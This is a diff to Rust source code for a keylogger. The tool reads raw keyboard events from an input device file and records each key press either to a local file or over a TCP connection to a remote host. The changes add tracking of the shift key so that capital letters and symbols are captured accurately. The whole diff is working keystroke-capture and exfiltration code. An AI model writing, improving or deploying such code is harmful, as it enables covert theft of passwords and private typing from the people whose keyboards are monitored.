@@ -4,7 +4,7 @@ use std::net::TcpStream;
 use std::env;
 
 mod parse_input;
-use parse_input::{get_input_code, get_input_type, get_key};
+use parse_input::{get_input_code, get_input_type, get_key, get_key_shift};
 
 fn main() {
 
@@ -30,6 +30,7 @@ fn main() {
 }
 
 fn write_local(mut event_file: File, mut keys_file: File) {
+    let mut shift: u8 = 0;
     loop {
         let mut buffer = [0u8; 72];
         let bytes_read = event_file.read(&mut buffer).expect("Failed to read from event file");
@@ -43,13 +44,28 @@ fn write_local(mut event_file: File, mut keys_file: File) {
         let input_type = get_input_type(&builder);
         let key = get_key(input_code);
 
-        if (input_type == "01") || (input_type == "rpt") {
-            keys_file.write_all(key.as_bytes()).expect("Failed to write to keys file");
+        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "01") || (input_type == "rpt")) {
+            shift += 1;
+        }
+
+        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "00")) {
+            shift -= 1;
+        }
+
+        if (shift > 0) && ((input_type == "01") || (input_type == "rpt")) {
+            let key = get_key_shift(input_code);
+            keys_file.write_all(key.as_bytes()).expect("Failed to write to key file");
+        }
+
+        if (shift == 0) && ((input_type == "01") || (input_type == "rpt")) {
+            let key = get_key(input_code);
+            keys_file.write_all(key.as_bytes()).expect("Failed to write to key file");
         }
     }
 }
 
 fn write_remote(mut event_file: File, mut connection: TcpStream) {
+    let mut shift: u8 = 0;
     loop {
         let mut buffer = [0u8; 72];
         let bytes_read = event_file.read(&mut buffer).expect("Failed to read from event file");
@@ -63,8 +79,22 @@ fn write_remote(mut event_file: File, mut connection: TcpStream) {
         let input_type = get_input_type(&builder);
         let key = get_key(input_code);
 
-        if (input_type == "01") || (input_type == "rpt") {
-            connection.write(key.as_bytes()).expect("Failed to write to socket");
+        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "01") || (input_type == "rpt")) {
+            shift += 1;
+        }
+
+        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "00")) {
+            shift -= 1;
+        }
+
+        if (shift > 0) && ((input_type == "01") || (input_type == "rpt")) {
+            let key = get_key_shift(input_code);
+            connection.write(key.as_bytes()).expect("Failed to write to key file");
+        }
+
+        if (shift == 0) && ((input_type == "01") || (input_type == "rpt")) {
+            let key = get_key(input_code);
+            connection.write(key.as_bytes()).expect("Failed to write to key file");
         }
     }
 }
